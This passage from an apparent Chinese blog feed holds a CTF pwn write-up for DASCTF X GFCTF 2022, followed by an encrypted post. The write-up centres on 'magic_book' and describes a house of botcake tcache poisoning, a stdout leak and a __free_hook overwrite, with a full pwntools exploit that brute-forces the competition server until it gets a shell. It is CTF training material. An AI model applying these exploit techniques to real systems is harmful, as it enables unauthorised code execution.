class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;have try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>最后要改read_got为syscall+0x1b 我本地有三个位要爆破，1/4096成功，</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/baopo.png" alt="baopo"></p><p>不过这题远端只要爆破一位1/16，我真的是吃饱了撑的</p><h2 id="magic-book">magic_book</h2><h3 id="0x01程序分析">0x01程序分析</h3><p>保护全开</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983%E4%BF%9D%E6%8A%A4.png" alt="题3保护"></p><p>有add和delete功能</p><p>选择9的话还有只能使用1次的uaf</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/uaf.png" alt="uaf"></p><p>没有show功能，要泄露libc就要打IO_stdout</p><p>用的libc是2.31的，还能用hook</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/libc2.31%E9%A2%983.png" alt="libc2.31题3"></p><h3 id="0x02利用思路">0x02利用思路</h3><p>1.使用house of botcake 的手法，在仅使用一次uaf的情况下，避免了tcache的key值检测，造成tcache poioning的效果</p><p>（victim堆在同一个地址，一个在tcachebin，一个在unsortbin）</p><p>2.切割unsortbin，修改unsortbin中存的main_arena+96地址为stdout（最后12位偏移不变，第12~16位要爆破4位，半个字节1/16）</p><p>改unsorbin中victim的fd指向存有stdout的堆的地址（堆地址也是一样，第四位要爆破1/16），造成tcache poioning指向stdout</p><p>3.分配堆到stdout，然后这么填<code>flat(0xfbad1800,0,0,0,b'\x00')</code>就能靠puts泄露出libc了</p><p>4.复用house of botcake ，往free_hook里写system,释放带有/bin/sh的chunk</p><p>所以成功率1/256</p><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/pwn/libc&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/pwn/ld&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uaf</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------house_of_botcake--------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#0~6</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#7</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#9</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(i)<br>    uaf(<span class="hljs-number">8</span>)<br>    delete(<span class="hljs-number">7</span>)<br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#10</span><br>    delete(<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#------_IO_stdout leak------------------</span><br>    add(<span class="hljs-number">0x50</span>,p16(<span class="hljs-number">0x26a0</span>))<span class="hljs-comment">#11</span><br>    add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p16(<span class="hljs-number">0xb690</span>))<span class="hljs-comment">#12</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-comment">#13</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-comment">#14</span><br>    add(<span class="hljs-number">0x80</span>,flat(<span class="hljs-number">0xfbad1800</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<span class="hljs-comment">#15</span><br>    stdin=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    libc_base=uu64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>,timeout=<span class="hljs-number">0.1</span>)[-<span class="hljs-number">6</span>:])-stdin<br><br>    <span class="hljs-keyword">if</span> libc_base == -stdin:<br>        exit(-<span class="hljs-number">1</span>)<br><br>    info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>    system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    <span class="hljs-comment">#-------re botcake------------------------------</span><br>    delete(<span class="hljs-number">13</span>)<br>    delete(<span class="hljs-number">12</span>)<br>    add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(free_hook))<span class="hljs-comment">#16</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<span class="hljs-comment">#17</span><br>    add(<span class="hljs-number">0x80</span>,p64(system))<span class="hljs-comment">#18</span><br>    delete(<span class="hljs-number">17</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#r=process(&#x27;./pwn&#x27;)</span><br>        r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29922</span>)<br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>            r.interactive()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br><br></code></pre></td></tr></table></figure><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983shell.png" alt="题3shell"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
      <tag>IO_leak</tag>
      
      <tag>shellocde</tag>
      
      <tag>house of botcake</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南大PA记录</title>
    <link href="/2022/03/01/%E5%8D%97%E5%A4%A7PA%E8%AF%BE%E7%A8%8B/"/>
    <url>/2022/03/01/%E5%8D%97%E5%A4%A7PA%E8%AF%BE%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2c614681beb24a571b1daa511af71762fd98fe9d6398da1afefd6b8e6b8cc314">6d48864991901107494efd2d96d51f6f508cef7b87454df798ee8a54f80fe92a44ff093812ab3a3e0c540e7b5d2707151fa178dc301c2be08b452ee168c8af88a07dee43fe55f1d2fdb1d8abef02a033d5a95736d10456b926b6c68f2c6885e944f44eef86b8567ad7086a62a4239ec98d2b4390621b8372bbf845f208f6c785ca5cb0e2d4587366f088b9bb13b930d1890e49af72157db7fa41faf75056425c055dde89bdd2266aa7b6a77c88c6a5817d2c5c138871f87deea6c15cde1fc842c553312b85948af2020a7e65644f9f5f2e295d3bb17580a4cab8c1399531e7fd4b71b42334ea13e9273bfbde66006698647ecc0e83ff62eecdc8fcc79212bb1103a34d00e606e13fa6f2a3924c9e17806f35e12d8c13012f4f400af4ceb74333feaad81a6a65398d61f9cdc48f8c3137328ca1468ba463b7bf1ca7ad07f6a01b1161554a08d09398cd6c02bdd118d52c7e0022a518d26528905ab39a0d3900840990785de910e3238ecde6295035a6c7d5d4298ba58b20a7e8b5cd75a930a304c71c633ef787f2dd489a70ff00ec73ea79f15a2616207068ab694a2e7727bc19280a968e0821275da4113ce48715c72949c57057537963b726aa4f0b6568eeb7c1698f5b9cbf4c0607a8e8be448bf01bb97957947a5fb82f826bd7781fe46fc5b7d00d9f4c46b3000beb793391aed00256751b9088437b879cd0ddca64a7026c9a23e4401a497ba30f1a051f3bef40e279f96dd5445baee24445ed78a6c18d0cf45f3cbe155b9037f531084ffb1b4254b01e4e7f5e42b760205cdc5fe46323bf13517b6ccda26fd8a3948408400bd57fbc5fbb9397b4206ba051530e34de5293c81ef6b3f55b5e298ba35f5f833ee2824f1f66f9aaea2858d3be0d0032075a7d3022c4c6dfbff4ff2ec4961bc3ed0c639db8e1175854549190d1d062b8b7693a6a2b67c95cc8bd87973a60032e22a1add3a6977c4ade0b195c8fd0cbc7a96a75ff5738068251bd92157dbb16060034954dc241fb2619be3d1d3a865412ad1dde51856736792278dc6f6a97e8e02377594037e3a137327dc82d452d868774221f51122ae1ba7a5a5e91da075c5024eb562ca3d87b12bb49d91e0d5f829308c17a4d53991afcafc1cfec21b1f30032d6ba3e3399b0c36e20c98e24e393d7f13ee954031ff41aeb6aeb5f673feb0763ac43a9a3c5c08e1329fd8850462efc6c91dcd82d171bc41b2642eabf4bfa913aa48737857462594196f7760b667b1a06c4b08b0fa33c987572a14713ec2cadff4e533e065a07d993994cafd4a3a61466b2c190f8af0c9e6b14a8f3450841c67490e14d80aa75d2efcf0bc5f2cbfd67dbfccc3e64504af2084eb2ec9afaa46273ea5904c53c4539c0dc05909c047929ac0fd9fa995576406a05757a54f588465356a347d17521fcbe41ffa3c80dab1c2f8e458fabd26b2066eee5aa0af8b406df2102d3f2f972e5c70cd1721ad06f68d029206f09b1111e6ffc8d1b0080359b799016a70e59df68b57f7d31e31ed79e2316332c436b07ca09055edcb4df9b1af12098ef95abe6b780af94cc0380c06e2028d88e1a4eeec755ac1e9ee5bf38b8b598e7b3dddbb508b5e3c93bd8570d666556003402843cfa27c1b25eb89a8b8a130af7fc0fefef238a2e2e568227d38c4270afaa5feb8c5580be82f92ca5774de3a44972490521e36056b58b92d8856af39ccfcfb8e044e88e3affec4035eef412b96e3af4ed191ee20041f1a2c2255d873aad7244959ffbd5f81731ba385254f2979373b8d1434db6e1d6a2771b745921a326c20de1c899c4f83e7b40a89478d43cfea89fee1d0e338f43e85cd59e8db35f27182309f74cbb1fe6066fd2fdc92147fb4d7d2904766f9b4a7ed30554ad895a098f564b08dc95588a161f5611c81df11c77ccad82beb635358bba724584e477ca22a23b61b4fc5a4da175449c2e27cbb8a6d5cf3aef235d029eb07b141eeaf6187a8b0bc5b6857f3939b6d0a6cff324abb253b3e603f3b8b3132f46f7f1d498bbf815eece9726257d4e04c4491fcf2bfb88bb038af66c5a88bc7eeec32a75e5f14917d4319b60d80ac0f7b26170b21318a3e359d9cf5e526592c79148e05b59ad59d04700bfee383d5dd88e70547ca1d132a77bcb530fed835f5f4f0b881ae0ad1899c28f084bbe61c975837124f28665aed65425ea6297ccf9083bf30ac1918daf6eaa4daa3788883fad22df7a051d22eeb29d7e745b5ce16183224945a0c385b74c1b72cafb66363ff8bb527b8f58c8e848bb309402610dba36ffeef4ace79c65bc20729048801b9b2603c24f5c98552ef29b53282435ec79f3d9c252aa1c698e5cb11abe0a9fe885e2b878787a96268faffae20a3453fc815bb080f2e17a23372423718fd78df706d7c9f3a49f3dfe1f0428989fb9b65b24df5fcccb4bcf74375d456563923355437b17c18530a2de8e4d3d223c00aa26be943d05f94e9f538d3e418fd47febff424c9e8586a97b73866c0e14a111f426d57530cd2fa8f9615cd79a3699450d67a35daa22ccc341b97d2254cd39bc81143916a0928fe1e41a553e01e6bbda4738cd03d63bd21a44070d8b3cf4e8666d0ba98abf6b589af99808f5b44b8d9d366e169dcbb5806722f6f3954ea3378b1858265dd22edcd80020985123448f1e8ccfdbce08e510367405c02a7e9608db9f57380e4c6720b7c57485db28393521ad131c578af567aafa239e9349c1d4449e3737c0abe85a38428bbf9c36c783a7d0807d18b35f8df2e4e364f0ccf3c6a8753a09a4d0692c624f0e06882c886e4cc36dfb73dc37caabd938eb192ae1f5471d258768a586c06f69734b5a6202cf7307c25bee83f18a603944f7c13891c8cb52cff7c1a5954681edb310aa7defb1b12fbe1343a919e8d4681b353db7c580c7781b6dd9e1e31541a88d3370ec23dfbef534213d1969430d4e969de1ba29e5eccf6520c0195faa215f1d42d3e465e7f8de0cde60702268e466afbc4033dc6da106ea511fc40106ceca4c77f27d69a2eadb57d09f5aa2b14b7dcdb8270ea72756bfc5e22b5aad73fda11e3b67a1103a1fc79e7cb407acb219bd1a529d3f3f281dffd9dbc5133a6a355a0f1cd101855dba4d41ff0700b967cea7b223acaefcaadde8400796b7e2e89949e28dee3e3b3d37c4da2514784d09a179be73fde175a03db9017a5980c1d18c8663220864583441dfc09f08e92250c9dd31e935cd22047ec66e4107712241ae6b27d874de19a673cbb65a39b361ba0066dada1950fc15401264f4ee55ad5d9750fdc95d1529a2913642b9e14c01de7def350c8193b3157021a4a63692bf7cb82d70a888995f79e7eb93b0009bdbaa94e8c2034403cd42d4046abc6374b1d0d1969e45d2f7bd8f8b4ed59475cdefbd9ac6985e0539d0a7846fcdce60f716f857bf5b8e8540e8989a748382f75f819afdc7a6e646742a254f9e8edc2f9685b0ba58d45399389bc2826d7ab84eb9ec2e5e2d0834526699519701e2ced977f0e2d41336bc23a1f39c968e5aad6aa82bf676920f078c421f6982c8e58d81c0dcb9960f2ab09ff6c6919b6cbe46b70000771f60189c1566cdc7c6dbe2772ee73cff753a319a8de5ab89f5c5b6719a946b1f4fc1208d96c14c24b05d29be1c26cd50a4c12a3897cd76d94ce7fcb89fc8e2f31ee18441e62931389ba9840bda6673ad7a8e25ba05b7345b9ace2fbbe1c6fb84bd61a9363bed6ca9dd1d68bc2efd98bfde8a2d5c054bd82f52e8b1946881cdf692208d0ed03193613cac86704de9110a36b4935eaabcc771b0db23a1fcb97ad252f5aa82ef8077d4c4d3b8a3cfa8969d0bff1e0b0f432e809d6a6d5c90bb70143fda3fa7dd7db3989e74f94cdac060a245ede0eafc4d892b2c8c81f2a144b5135db9f29795bb2f776beb8e7ac32d59c8fd495fb7bce11d18a15dd27aa944887a3d744afd3021114a9392109a77240553501352848e324d21b250d94dbe3b7c280dd01c3bb5695a45299eee123bb9621c0d1cdb69e13736d69c737c013a89b26bb53f6a2833681a488baa02e174a5cb2c10522b207ec3d583d567e32e265d06e761d8bcd7816411143381fb57888540a8c2bed189d29ac2a2a9cf7290dfedc9bd26fcbafc986d93c4d0ab67e6ed77043c46b5824387a67a306b480db74c523ab68755b611f59262642badbb847c9c0300e78d504bc5c2c45a803af2302322d960f70f22340f87b8626ce841abd92e9d838448471f6ff9df31da19ade1f5e394a0d16339245b8922e9b6b8915735c5255adfa01752649c97777a10a14d03719100054c3928cb940cfeaf4447c39febb4f75479f340e5e9d136618fdb1570b40678a84f5157d5a8ebbb895b64a3072da2824c98a663acc2ab381ffa73c96d9497ab3fb032eef71e5f45e8c631ce2517bab15e64aa9ef228a4b11505ca3c74975d9e873281ca9e6d71858466de5b53ec17899e67241baf73b3a05cf36679be89285eb0f38f96b9c41bf412a48f55f1d326432f594556af70c2e5ed41c202f75b97de7c23945cfecb8ea3f7078dd5463e2c863f8b752edd74a22f89e39190d8e320cbf07fc0526a16b66271c0951e248eb811ccb71e228419c3e3ac0eb66ab40817c7e2d6690841c807ed9d7a50ebe8ab3536375f35091897389c92c5c14b4d62cc0061418dd99a2868b872fb1bd327a42e4f5d4b43636b1fc19baf7f257e87f81861196719171593e25dda081c23d0868ac9b260d610cc681baa20371290bbea7f42faf5fb8a9fae041e81685dafc5db4ab7bc4516a2497f545160ff745a075618d7c572e113c1f5f4fdb8fc6f232d860c95fbf88dd60466c3c15fca7ac80bd2c69aa3c8453b14bc44de1cb4f68ec838e9017002c4d310e95a4fd4895d34a86506714ca6657db212d62584c5b3dd3773f7c8b9bbf4ac9b821dc69d55ecc34fb1d8478b832aa0b1536bd63a450d6e098bab77d87ebbc7755b193680c6f0db89d9f4412a127c2e52a34de76b7a5dadb4d57c597287d1320304c70a16bd22c4f2e7f3a1758e114e3c0cb9e33371d341850c8d40c24595dc96e046137d01e00e0591823fde765f48a684f6e2c1caa1313c87fa3559f51a0d17d2ac2225da3a59c28bc81b9d6fd1fe9f285b0b4fb8b9942742de58e5c8aa80f223f14b4b9e97f1cb2f65111860dea6ffbd9c803f8a004be7b50b9e62e02052b5373d17cffccf8670f792871dc75fc15f981466c09ab236a6c1a6f10f57b4b4cc0d706d5329f98a51aa068958ebd6f8b791140c1958be325d27bd8df096bb4759e62eea496a1026bd2ccfef6ea55d9c7c50fd8999e4a24aff5f4b1dad20857d96367ae063cafec7425adb7c1344f4b39022bb6d6e4e0b38df7c763d41f42a28f25349029e9977ee045ba6460252f5f6d11e4fe4727c30a05b8d2d9b1dab03e174d04d6fd4063751fa866631f89f1373d9ba3b32811e6a8b81d0a564295684e90cbc0dcc3b744239ebbb781c123c6c920c05ac55ae10dd0eba2833778ef45e2cfa433a353ec9165dbe76cfded77973df34c9b8d67899460ce24e07c5634a17d21552dcef69b4f7ff6d47838185c5d574b995aa8d8a732342a39d962f84b8a40a0cef94826051fd6504b14c99de866c248abb3567492b044ae1015035cb385f87760dd6f104550b863746acefb73a2822f0fe5010fe1e3ec65beefa557162df1577ce7eeb50d7df367ae5f1f867209f28519dda0d22666a94930488e19f732802c56ddc49085365182c23f381de4d753fa7dd195b900084d22ef233709717f2f509c030cfeee729fd85f22b9e5be086f9f1fc74abed5ec798f509a123b7ca30387b60f21a6b8a45652aafe331ee6b56f236a10897a640f207627c3f29350d9ca6583eaf61c7756832c66ee1766fabf6f178db01d756dca46bfcb91f3d4468966b2229af8ae4bcdaad1e3cbb6a1c7255265f489e8a7a7a2490e05fa03a2ae1271602f0e13fd36ecd3043d2b082e1d6413ee735dce449cd1809d35905f47ff504a1d07bc9fac554d7ea3e1c64b3e9500a19d5decfaf3b68be47016d46ff7c003308f5ee82a04c808e07250142b5fd0b47642993a75541c9d52a49732ba622bae966118b61dd36811692a2a19db284af5ea72b79c7d4e6c7c502fdc7bd21c9bcc3dd846c94060fae9f91ceab3ff4899f78c925fc8907f73882df69eb28c0695bfc717bf532773c63fbd5e9ead062212947ca815e3a92cd740dc6da80f470dcf37595fc9bac324eb1beb31dede0bd0e82c852f1f94a2dd92a0b24c167befe8ec34462a1930ae5d36e03f2809a419093a63cab21c4fa887f3cf85f9acb3ee6ba647343fcb18ed762cc89ae4365b7551a344e24eb62b57d79830664e14118b6e9cbe8da34d4e2737093038a59fa632bb34b526bbe754b0b0779636e59cdc7ed596317a91d18a00b81a3f2262034b5734fa53fa5b51aa693aa810d4b2460ccf1c2c459f047dcf37f2fb826b05b26424e100ec9cb981d906d01d983fb4f281b61b7a930388f4ca02e2ce7f8e531faa9524a766532c996892f00ae92423d70ea76b1ac5072b3752093b94c2f3a6bdd37f075260e8d6a3ec8dfaf3d3c85038a32ae5aa84336ff85430d14e2b6b3519d40370b4fbff39f9e2f819a231d17d18e1515c29787e7e6099c36a3594f9f5ac8bf26aba4e8b5e4cff7b0263c957880d4d6354d785ac60c566d15511da93aa6056864c4f56c32f8d05eb8bc537ba971aab083dc8cd2f9b9b7371d0cdcdc596081e9b391b9ac0e4115807238aeac854c1dc66e7ed99143f9873a0097045a5b0b2d291dfda7c50abbd9d9706bc9f9ebf7c4e9d14f979dd02bc2e6c2ef8c80ef4b5af7c094cd893e1507c91661fb54c86997ca888afd015141df290726e6568b41065dedad034f53c794f5f4150a998a2f7137b1a9752016a1cb8d6c5ceaab3bc5dceb636f421d536592ae58304ce98eb413a16592dd98088092e3810b0b6ebe7e479a5c36c9a6a9cd8816c9a1d1ca034097645d5830b8983fc4ca81b1695ebac298000b390b317285bb6e2f849852ae3be7e5453091a5249f7c5be06465c7b3a51f4355b45da459db35842f56bbbdc2c93bb01d4802461691e976c325a2cf896ea395dd2b8a6592b4c6a340082f7613753cc5dc58f77eb4ea418d4be978a577d982bcaa967e121adbded4457e2e2095cbdec71b1ec9475c101b6381fce07de7df0a836b57b2f93ca3a1fcafa4626de33e6ed071b0aaf6beebdc5ada5e9d2ec7f164ebfa1d1d9df248d0ad45ebcc5bade46533e45ea2e8e44f93c365ae12c36c9e7077e1efa900f6c95db2605678b6451e0a8c8afcad0f80d19afeeeb53703db1715dc3154eb5c7095e0c77c9d8c09a2301ea7a89b936356438305abddc90261e5776fdfac7d058d5825f2655a51898309e7292db803841f7bbebb7e8e0ffc8ceed5645da5d6a81a9aea931154c3e8862e1acd65d5c3a2e6b393431577b8bcdd1ce012d87baa645072cc698a76aed46e833d1618b52c4699bb124ad4d5be46fca8d4cd8a97ef4e90b561d7602ddd03ff6ef53d06b82d83a4fd79a7c8968df62e1727878e1d025d34c2bde677bff5c216e910e1d14f9a7f7d2ae7a06a44001abc011705a43c91fa6f8edcc91b279a9b34de03baa93686e960e14506d51d2db2cde24d7f10482d88bb471bf633ccf55189dfc613d21b55d22f92eddeb5be80c1e3026373a310ddb1c2e4e1aefa515201e68d9190377a341b7e0aaa48868ed7bb9cc9f64e062551c15f91d5532e8dd8f0fbd8a975801fa5c6d2065a42dee0970fa4fea164168cc0d96fdc656ac692f3883312376ebe83712f02b63c8b0de5cf91be4f4b6e79bd90e9ce6a9b686cd146a652892fa29f13d4307912b540a1cff9bc888df46e80848499dc803f09f4a2735f2c0f7820268c058fc61da17c79d16068cb08a93f1c62a70174729c255b33c2718631a44b7c909d53ef1a43c6adb8ed978377e88086b1df11bcbf54096e9a8e1348c484a511ada00c67a130c2f138ad746d02876063e210d2f64de1bf5403188e0f6827f69fd8ae000ac5e5ce0c593b417adda54a098202b5872d228cb936f3a4c0f058ec5bbd5cc5d94a3e5c4ee49df98548e1a96fce67f61dc47b883dab714b6a871991d0aeddf3c9822739379af16c3cdaed9330b041c5be5c063c5aa638ebc9262fe62c4e8f6736ce0edcc3c587552b10580abc3735d3cea9a8df38e6c08484a116c985ea4b96e25223b6eba7346153eca9497be2e6c644b1d5ab3d513afce612dfdb01b03f50b0156e3161f691e54545cef0f97b67862f3c2d42c6c0c626a72f3935bd562d7b15612baf13caadc908c875f78780ce32d56481ea5c097a03c874cce53c02ddb7d0e00fe474f2fc7989405a966e273767a85f342ed6ee4937d250722bae8e4044dde68d22a16a70093b72087382b8ee6fa895c8f074abbd7b66b6cf127df42ae5a50b5116067b75acc04648f919b13cc55fbd8db4eae0378c349aac9bd0d9b2c877d4d080a7b48c150ec5d7ed7ea015ab24da7565dcddd4b1776af42df5c803136eb09ac19cca6863330f1af54d2f6898fdbe76004d7897ff2ca8b1d219ceef7259f66d0d787b00bef5567eaec2df5e0477abc306e5d29c5451f9830e3f9b12654cb884e6559d89a830a71d7ce1ec78e88235f5e53e8832f2098d5d6763b276d1252e43f7b666590e3a60439ca3be54b7253347a5b66c348ebff2240bcb33711d0c2a092546aed796ee6b5600c24517b24c2a6b571640d36ae4b4795a3260e183a469373bc4438e4d0bb4feb36677b92cd8a768497878c5d350aabce034123a0defced16c267b848326ff8cb3a3ba91659adbdcdc5214241d0f9030e0fd6ef4368e7439da34b1d8529fc3be8eb48f152391957802d88052744f2e839f9455c2aeb17195f4c8682d1a9b8e8d6ecc03b5d909c691e505d58a08afc7a0927c11216ee3754503e464c0ab38fc67aff3ead1c2ef246068851937a864002ac59a5f8eff7ac3efc679c276ba8066a206c591261a415aa5dbc6852c5eb12ef9fd5b0c147948b5aa84672f66acb33ec2725b618e92f331d34264918b45f52f1823471d231b0161cd454322753d71a9a10c5f83395bfae4e165054143b7088ee3593545e20461ee0aa5d2396d81591b7f1f641501c20030b20236ba1b8e8eb7e61c70398845c038370138535d10859ac71d07afe04fe10bd04c01d4cef1c2ae08e3c78d5470246f8a6b61ec0c805ce49890b77854dea1a8000a7c7aae1247dd8e8f264c7b92dd8226b6709e02230f1abcbe49621517916bd96ea56635db5264fdb295d90e713e4cdd7387206439bd14f989e68a5f546e076a2787b9d9d9c51dbbf0c483fda179a6fe1f10e8060a0fd10e7b997be3d0707e1ac34bc8de003cc6a72a469331e24979ead2bc54bfff56c3500c2e5e84b45d13d0a9c88862ab8a86d8223a12ab88ab7b4dae5ac5aaf0711e326ff86512dac412a060f0b90bf5900be00f7484bc62f28ee49c7e4b969676b23282e26a7260e6b2838